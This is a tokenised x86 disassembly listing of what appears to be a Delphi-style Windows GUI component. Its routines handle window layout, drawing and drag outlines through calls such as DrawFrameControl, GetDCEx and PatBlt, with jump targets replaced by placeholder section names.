mov [ ebx + 0x14 ] esi
jmp r-xdata
mov eax esi
mov edi [ ebp - 0x18 ]
sub edi [ ebp - 0x14 ]
test edi edi
jle r-xdata
mov [ eax + 0xc ] ebx
mov [ ebx + 0x18 ] eax
mov eax [ eax + 0x14 ]
mov [ ebx + 0x14 ] eax
mov [ ebp - 0x1c ] 0x1
mov eax [ eax + 0x14 ]
inc [ ebp - 0x1c ]
dec edi
jne r-xdata
sub_44bf4c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
push 0x0
push 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edi [ eax + 0x18 ]
mov eax edi
add eax esi
sub eax 0x2
push eax
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx edi
add ecx ebx
sub ecx 0x2
mov edx esi
mov eax ebx
call sub_412f04
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41e234
push eax
call DrawFrameControl
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44bfa4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov edi eax
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx 0xff000014
call sub_41d6c0
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx ebx
mov edx esi
call sub_41de78
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx ebx
mov edx edi
call sub_41de18
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov edx edi
call sub_41de18
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx 0xff000010
call sub_41d6c0
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov edx esi
call sub_41de18
mov ecx ebx
dec ecx
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_41de18
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_44c02c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov ebx [ ebp + 0x8 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov al [ eax + 0x5b ]
dec eax
sub al 0x2
jae r-xdata
push ebp
mov eax [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
sub eax [ edx + 0x18 ]
inc eax
mov edx [ ebx + 0x4 ]
inc edx
call sub_44bf4c
pop ecx
push ebp
mov eax [ ebx + 0x4 ]
mov edx eax
add edx 0x5
push edx
mov ecx [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
sub ecx [ edx + 0x18 ]
sub ecx 0x2
mov edx eax
add edx 0x3
mov eax [ ebx ]
add eax 0x2
call sub_44bfa4
pop ecx
push ebp
mov eax [ ebx + 0x4 ]
mov edx eax
add edx 0x8
push edx
mov ecx [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
sub ecx [ edx + 0x18 ]
sub ecx 0x2
mov edx eax
add edx 0x6
mov eax [ ebx ]
add eax 0x2
call sub_44bfa4
pop ecx
push ebp
mov edx [ ebx + 0x4 ]
inc edx
mov eax [ ebx ]
inc eax
call sub_44bf4c
pop ecx
push ebp
mov edx [ ebx + 0xc ]
sub edx 0x2
push edx
mov edx [ ebx + 0x4 ]
mov ecx [ ebp - 0x8 ]
add edx [ ecx + 0x18 ]
inc edx
mov eax [ ebx ]
mov ecx eax
add ecx 0x5
add eax 0x3
call sub_44bfa4
pop ecx
push ebp
mov edx [ ebx + 0xc ]
sub edx 0x2
push edx
mov edx [ ebx + 0x4 ]
mov ecx [ ebp - 0x8 ]
add edx [ ecx + 0x18 ]
inc edx
mov eax [ ebx ]
mov ecx eax
add ecx 0x8
add eax 0x6
call sub_44bfa4
pop ecx
jmp r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_44c108
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41db18
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_44c25e
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ esi + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_44112c
mov eax [ ebp - 0x4 ]
call sub_41de50
xor eax eax
push ebp
push sub_44c241
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41e2b4
xor eax eax
push ebp
push sub_44c224
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x14 ]
call sub_445ab4
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44c22b
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_41e2b4
retn
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec [ ebp - 0xc ]
jne r-xdata
mov eax [ ebx + 0xa0 ]
cmp eax [ esi + 0x14 ]
jne r-xdata
mov eax [ esi + 0x14 ]
mov edx [ ebp - 0x8 ]
call sub_445a78
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_441ef0
lea ecx [ ebp - 0x1c ]
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi ]
mov eax [ ebp - 0x1c ]
sub eax [ ebx + 0x40 ]
add eax eax
sub [ ebp - 0x1c ] eax
mov eax [ ebp - 0x18 ]
sub eax [ ebx + 0x44 ]
add eax eax
sub [ ebp - 0x18 ] eax
mov eax [ ebx + 0x48 ]
mov edx [ ebp - 0x14 ]
sub edx [ ebp - 0x1c ]
sub eax edx
add eax eax
sub [ ebp - 0x14 ] eax
mov eax [ ebx + 0x4c ]
mov edx [ ebp - 0x10 ]
sub edx [ ebp - 0x18 ]
sub eax edx
add eax eax
sub [ ebp - 0x10 ] eax
lea eax [ ebp - 0x1c ]
push eax
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x10 ]
sub_44c26c
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov ebx ecx
mov esi eax
mov eax [ esi + 0x14 ]
call sub_4478b4
mov edi eax
test ebx ebx
je r-xdata
mov eax [ esi + 0x14 ]
call sub_441f98
push eax
lea eax [ ebp - 0x1c ]
push eax
mov eax [ esi + 0x14 ]
call sub_441f54
mov ecx eax
xor edx edx
xor eax eax
call sub_412f04
mov eax [ ebp + 0x8 ]
push esi
push edi
lea esi [ ebp - 0x1c ]
mov edi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
test edi edi
jle r-xdata
cmp [ ebx + 0x9c ] 0x0
je r-xdata
push 0x2
mov eax [ ebp + 0x8 ]
push eax
push 0x0
mov eax [ esi + 0x14 ]
call sub_448d84
push eax
call MapWindowPoints
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov al [ ebp + 0xc ]
dec al
je r-xdata
cmp edi 0x2
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
sar eax 0x1
jns r-xdata
dec al
je r-xdata
mov eax [ ebx + 0x40 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x44 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x48 ]
mov edi eax
mov edx [ ebx + 0x4c ]
mov [ ebp - 0xc ] edx
mov dl [ ebp + 0xc ]
add dl 0xfd
sub dl 0x2
jae r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
sar eax 0x1
jns r-xdata
dec al
je r-xdata
mov al [ ebp + 0xc ]
dec eax
sub al 0x2
jae r-xdata
mov edi eax
sar edi 0x1
jns r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
sar eax 0x1
jns r-xdata
dec al
je r-xdata
mov al [ ebp + 0xc ]
sub al 0x2
je r-xdata
mov eax [ ebx + 0x4c ]
sar eax 0x1
jns r-xdata
adc edi 0x0
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0x8 ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
sar eax 0x1
jns r-xdata
jmp r-xdata
mov eax [ ebp - 0xc ]
add [ ebp - 0x8 ] eax
sub al 0x2
jne r-xdata
mov [ ebp - 0xc ] eax
adc eax 0x0
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x1c ]
push eax
mov ecx edi
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_412f2c
mov eax [ ebp + 0x8 ]
push esi
lea esi [ ebp - 0x1c ]
mov edi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
add [ ebp - 0x4 ] edi
jmp r-xdata
sub_44c3e0
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_44c3e0
pop ecx
mov eax ebx
call sub_403344
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_44c3e0
pop ecx
sub_44c414
push ebp
mov ebp esp
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop esi
pop ebx
pop ebp
retn
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x18 ]
test eax eax
je r-xdata
push ebp
call sub_44c3e0
pop ecx
mov eax [ ebx + 0x14 ]
test eax eax
je r-xdata
mov edx [ ebx + 0xc ]
mov [ eax + 0xc ] edx
jmp r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov edx [ ebx + 0xc ]
mov [ eax + 0x8 ] edx
cmp ebx [ esi + 0x64 ]
jne r-xdata
mov edx [ ebx + 0x18 ]
mov [ eax + 0x18 ] edx
mov eax ebx
call sub_403344
xor eax eax
mov [ esi + 0x64 ] eax
sub_44c470
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44b480
test eax eax
je r-xdata
pop esi
pop ebx
retn
cmp eax [ ebx + 0x38 ]
jne r-xdata
mov edx eax
mov eax ebx
call sub_44c4ac
xor edx edx
mov [ eax + 0x4 ] edx
jmp r-xdata
mov [ esi + 0x9c ] 0x0
mov eax [ ebx + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
sub_44c4ac
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_44c719
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
jne r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ca4
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405ca4
mov edx [ ebp - 0x8 ]
pop eax
call sub_40435c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bcbc
call sub_403ad0
mov eax [ ebx + 0x14 ]
call sub_44ac0c
cmp eax 0x1
jne r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405ca4
lea eax [ ebp - 0xc ]
push eax
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405ca4
mov edx [ ebp - 0x10 ]
pop eax
call sub_40435c
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bcbc
call sub_403ad0
cmp eax 0x2
jne r-xdata
mov eax [ esi + 0x64 ]
xor edx edx
mov [ eax + 0x8 ] edx
mov [ eax + 0x10 ] 0x0
jmp r-xdata
mov eax [ ebx + 0x18 ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x18 ]
test eax eax
jne r-xdata
mov eax ebx
call sub_403344
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44c720
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_4040b8
retn
mov edx [ ebx + 0xc ]
mov [ eax + 0xc ] edx
mov edx [ ebx + 0xc ]
test edx edx
je r-xdata
mov eax [ ebx + 0x14 ]
mov edx [ ebx + 0xc ]
mov [ eax + 0x8 ] edx
mov eax [ ebx + 0xc ]
xor edx edx
mov [ eax + 0x18 ] edx
call sub_44afbc
jmp r-xdata
mov edi eax
mov edi [ ebx + 0xc ]
jmp r-xdata
mov eax ebx
call sub_44b134
mov edx eax
mov eax [ ebx + 0x18 ]
call sub_44b170
mov eax [ ebx + 0x18 ]
call sub_44afbc
mov [ edx + 0x18 ] eax
push esi
push sub_44ccbc
mov edx [ ebx + 0x14 ]
mov eax esi
call sub_44b4e8
mov eax [ ebx + 0x14 ]
cmp eax [ esi + 0x64 ]
jne r-xdata
mov edx [ esi + 0x64 ]
mov eax [ ebx + 0x14 ]
cmp edx eax
jne r-xdata
cmp [ edi + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x14 ]
mov eax [ eax + 0x18 ]
mov edx [ edi + 0x8 ]
mov [ edx + 0x18 ] eax
test eax eax
jne r-xdata
mov edx [ esi + 0x68 ]
mov eax edi
call sub_44b170
mov eax [ esi + 0x64 ]
call sub_44b134
mov [ esi + 0x68 ] eax
mov eax [ esi + 0x64 ]
call sub_403344
mov [ esi + 0x64 ] edi
xor eax eax
mov [ edi + 0xc ] eax
xor eax eax
mov [ edi + 0x18 ] eax
xor eax eax
mov [ edi + 0x14 ] eax
mov eax esi
call sub_44cc94
jmp r-xdata
mov [ eax + 0x10 ] 0x0
mov edx [ edi + 0x4 ]
mov [ eax + 0x4 ] edx
xor edx edx
mov [ eax + 0x8 ] edx
mov eax edi
call sub_403344
mov eax [ esi + 0x64 ]
mov [ eax + 0x8 ] edi
xor eax eax
mov [ edi + 0x18 ] eax
xor eax eax
mov [ edi + 0xc ] eax
mov eax [ esi + 0x64 ]
call sub_44acb8
mov edx eax
mov eax edi
call sub_44b15c
mov eax edi
call sub_44afbc
jmp r-xdata
mov edx [ edi + 0x8 ]
mov [ eax + 0xc ] edx
mov eax [ edi + 0x8 ]
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0x14 ]
mov [ edx + 0x8 ] eax
jmp r-xdata
push esi
push sub_44ccbc
mov edx [ ebx + 0x14 ]
mov eax esi
call sub_44b4e8
jmp r-xdata
mov eax [ eax + 0xc ]
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0x14 ]
mov [ eax + 0x14 ] edx
cmp [ eax + 0xc ] 0x0
jne r-xdata
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0xc ]
mov [ eax + 0xc ] edx
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax [ edi + 0x8 ]
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0x14 ]
mov [ eax + 0x14 ] edx
push esi
push sub_44ccbc
mov edx [ eax + 0x14 ]
mov eax esi
call sub_44b4e8
mov eax [ ebx + 0x14 ]
call sub_403344
mov eax edi
call sub_403344
jmp r-xdata
mov edx [ eax + 0xc ]
mov [ edx + 0x18 ] eax
sub_44c728
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov edi eax
mov esi [ edi + 0x14 ]
test [ esi + 0x1c ] 0x1
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x64 ] 0x0
je r-xdata
mov eax esi
call sub_4478b4
test eax eax
jle r-xdata
mov edx esp
mov eax [ edi + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx esp
mov eax [ edi + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
test bl bl
jne r-xdata
push edi
lea esi [ esp + 0x4 ]
add edi 0x1d
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov eax [ edi + 0x64 ]
mov dl [ eax + 0x10 ]
dec dl
je r-xdata
lea edx [ edi + 0x1d ]
mov eax esp
mov ecx 0x10
call sub_407f58
test al al
jne r-xdata
mov edx [ esp + 0x8 ]
sub edx [ esp ]
call sub_44b15c
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
mov [ edi + 0x68 ] eax
jmp r-xdata
dec dl
je r-xdata
mov eax [ edi + 0x14 ]
call sub_447820
test eax eax
jle r-xdata
mov edx [ esp + 0xc ]
sub edx [ esp + 0x4 ]
call sub_44b15c
mov eax [ esp + 0x8 ]
sub eax [ esp ]
mov [ edi + 0x68 ] eax
jmp r-xdata
xor edx edx
mov eax edi
call sub_44cb44
cmp [ edi + 0x6c ] 0x0
jne r-xdata
push edi
push sub_44ccbc
xor edx edx
mov eax edi
call sub_44b4e8
sub_44c804
push ebx
push esi
push ecx
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop edx
pop esi
pop ebx
retn
test ebx ebx
je r-xdata
mov eax [ ebx + 0x14 ]
mov al [ eax + 0x10 ]
cmp al [ esi + 0x48 ]
jne r-xdata
mov eax ebx
call sub_44b134
mov [ esp ] eax
fild [ esp ]
fmul [ esi + 0x40 ]
call sub_402b00
mov edx eax
mov eax ebx
call sub_44b15c
sub_44c840
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_404544
xor eax eax
push ebp
push sub_44c8ab
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_404354
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov ebx [ eax ]
call [ ebx + 0x10 ]
cmp [ ebp - 0x8 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44c8b2
lea eax [ ebp - 0x4 ]
call sub_404094
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
sub_44c8b8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_44c967
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov esi [ eax ]
call [ esi + 0x10 ]
lea edx [ ebx + 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x1
mov esi [ eax ]
call [ esi + 0x10 ]
lea edx [ ebx + 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov esi [ eax ]
call [ esi + 0x10 ]
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_44aec4
mov eax [ ebp - 0x8 ]
call sub_44c840
pop ecx
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
mov edx [ ebp - 0x4 ]
inc edx
call sub_44c8b8
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44c96e
lea eax [ ebp - 0x8 ]
call sub_404094
retn
mov edx [ ebp + 0x8 ]
push edx
mov edx [ ebp - 0x4 ]
call sub_44c8b8
pop ecx
sub_44c974
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_44caad
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0x70 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_403314
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_44ca5c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
call sub_447820
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0xc ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov ebx [ ebp - 0xc ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44ca63
mov eax [ ebp - 0x10 ]
call sub_403344
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
cmp [ edi + 0x8 ] 0x0
je r-xdata
push ebp
lea ecx [ ebp - 0x14 ]
mov edx esi
mov eax [ ebp - 0x10 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x14 ]
call sub_44c840
pop ecx
inc esi
dec ebx
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov edx esi
call sub_447834
mov edi eax
cmp [ edi + 0x57 ] 0x0
jne r-xdata
mov edx [ edi + 0x8 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
sub_44ca63
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0x68 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
xor edx edx
call sub_44c8b8
pop ecx
mov edx rw-data
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44cab4
lea eax [ ebp - 0x14 ]
call sub_404094
retn
sub_44cabc
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
pop ebp
retn
mov eax ebx
call sub_44b20c
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_44b234
call sub_44cabc
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_44b20c
call sub_44cabc
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp ebx [ eax + 0x64 ]
je r-xdata
mov eax ebx
call sub_44ac3c
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x64 ]
mov esi [ ebx + 0x14 ]
cmp eax esi
jne r-xdata
mov eax [ esi + 0x14 ]
call sub_44b134
mov edx eax
mov eax ebx
call sub_44b15c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax ebx
call sub_44b15c
jmp r-xdata
sub_44cb44
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
test edx edx
jne r-xdata
push ebp
mov eax edx
call sub_44cabc
pop ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
mov edx [ eax + 0x8 ]
sub_44cb88
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
cmp ebx [ esi + 0x64 ]
je r-xdata
mov eax [ ebx + 0x14 ]
mov al [ eax + 0x10 ]
cmp al [ esi + 0x48 ]
jne r-xdata
mov eax ebx
call sub_44b134
mov edx eax
add edx [ esi + 0x4c ]
mov eax ebx
call sub_44b15c
sub_44cbb8
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi ecx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov [ ebx + 0x60 ] edx
mov eax [ ebx + 0x14 ]
call sub_448d84
mov edx eax
mov eax [ rw-data ]
call sub_44d718
mov eax [ ebx + 0x14 ]
call sub_448d84
mov esi eax
mov [ ebx + 0x5c ] esi
push 0x412
push 0x0
push esi
call GetDCEx
mov [ ebx + 0x58 ] eax
mov eax [ esp ]
mov [ ebx + 0x50 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x54 ] eax
mov eax ebx
call sub_44cccc
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_44cc18
push ebx
mov ebx eax
xor edx edx
mov eax [ rw-data ]
call sub_44d718
mov eax ebx
call sub_44cccc
mov eax [ ebx + 0x58 ]
push eax
mov eax [ ebx + 0x5c ]
push eax
call ReleaseDC
mov eax [ ebx + 0x60 ]
mov edx [ eax + 0x14 ]
cmp [ edx + 0x10 ] 0x1
jne r-xdata
mov edx [ ebx + 0xc ]
sar edx 0x1
jns r-xdata
mov edx [ ebx + 0xc ]
sar edx 0x1
jns r-xdata
add edx [ ebx + 0x50 ]
call sub_44b15c
adc edx 0x0
add edx [ ebx + 0x54 ]
call sub_44b15c
jmp r-xdata
adc edx 0x0
mov eax [ ebx + 0x60 ]
mov edx [ eax + 0x14 ]
mov eax ebx
call sub_44cb44
push ebx
push sub_44ccbc
mov eax [ ebx + 0x60 ]
mov edx [ eax + 0x14 ]
mov eax ebx
call sub_44b4e8
xor eax eax
mov [ ebx + 0x60 ] eax
pop ebx
retn
sub_44cc94
push ebx
mov ebx eax
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x14 ]
call sub_447820
test eax eax
jle r-xdata
push ebx
push sub_44ccbc
xor edx edx
mov eax ebx
call sub_44b4e8
sub_44cccc
push ebx
push esi
add esp 0xfffffff0
mov ebx eax
mov esi [ ebx + 0x60 ]
test esi esi
je r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov eax [ esi + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebx + 0xc ]
sar eax 0x1
jns r-xdata
mov edx 0x2
mov eax esi
call sub_44ad00
mov [ esp ] eax
mov eax [ ebx + 0xc ]
sar eax 0x1
jns r-xdata
mov edx [ ebx + 0x50 ]
sub edx eax
mov [ esp ] edx
mov edx 0x1
mov eax esi
call sub_44ad00
mov [ esp + 0x4 ] eax
mov eax [ esp ]
add eax [ ebx + 0xc ]
mov [ esp + 0x8 ] eax
mov edx 0x1
mov eax [ ebx + 0x60 ]
call sub_44ad6c
add eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
adc eax 0x0
mov edx [ ebx + 0x54 ]
sub edx eax
mov [ esp + 0x4 ] edx
mov edx 0x2
mov eax [ ebx + 0x60 ]
call sub_44ad6c
add eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
add eax [ ebx + 0xc ]
mov [ esp + 0xc ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebx + 0x10 ]
call sub_41d9fc
push eax
mov eax [ ebx + 0x58 ]
push eax
call SelectObject
mov esi eax
push 0x5a0049
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0x8 ]
sub ecx edx
push ecx
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0x8 ]
sub ecx eax
push ecx
push edx
push eax
mov eax [ ebx + 0x58 ]
push eax
call PatBlt
push esi
mov eax [ ebx + 0x58 ]
push eax
call SelectObject
sub_44cdb8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0x4 ]
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov eax [ ebx + 0x14 ]
mov al [ eax + 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x14 ]
cmp al [ edx + 0x10 ]
jne r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_44cdb8
pop ecx
mov eax ebx
call sub_44b134
mov edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_44b134
cmp edi eax
jle r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_44cdb8
pop ecx
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax ebx
call sub_44b134
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_4248ec
mov edx [ ebp + 0x8 ]
